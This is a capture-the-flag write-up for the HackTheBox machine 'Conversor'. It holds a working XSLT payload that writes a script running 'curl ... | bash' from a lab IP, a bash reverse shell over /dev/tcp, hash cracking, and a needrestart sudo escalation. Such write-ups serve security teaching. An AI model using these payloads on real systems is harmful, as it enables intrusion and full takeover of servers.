# Conversor: HackTheBox

Difficulty: Easy

## Enumeration

- Port Scan: 22,80 open
- Port 80 has domain name `conversor.htb`
- Register and login as any user leading us to a file upload page, where we can upload an xml and an xml stylesheet file.
- On fuzzing we find an about page with source code


## Initial Access

- This is the tricky part of the box. So this snipper:

```python
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
```

- This is the vulnerable part of the code because this parses and transforms the user supplied xml.
<!-- I spammed a writeup for this bit as there was really no logical way for me to figure this out. Not sure how I should've arrived at this to be honest. Even GPT did not spot this exploit -->
- Libxml2 supports `http://exslt.org/common`, this is dangerous as it includes a function called shell:document. This allows the xml to output the result to multiple files. So we'll just add this output to the /scripts/ directory and get our hands on a shell. (I know this by seeing the `install.md` file in the source code.)

- So the payload would look like this (filename: payload.esxlt)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl http://10.10.14.50:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>

</xsl:stylesheet>
```

- I will create a shell.sh file containing a reverse shell payload.

```bash
#!/bin/bash

sh -i >& /dev/tcp/10.10.14.50/4444 0>&1
```

- Now we will start a python http server on port 8000 and a netcat listener on port 4444.
- Upload the xml and the xslt stylesheet and wait for a minute or 2. The exploit will succeed.

- Once we gain the shell, we can check the instance/users.db file for the initial user (password is crackable in crackstation).

## Privilege Escalation

- Running `sudo -l` gives this:

```
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

- Just follow [this](https://medium.com/@momo334678/needrestart-sudo-privilege-escalation-44ae1c89bcc2) to get root.
- Exploit command:

```bash
sudo /usr/sbin/needrestart -c /root/root.txt
```

Happy Hacking :)
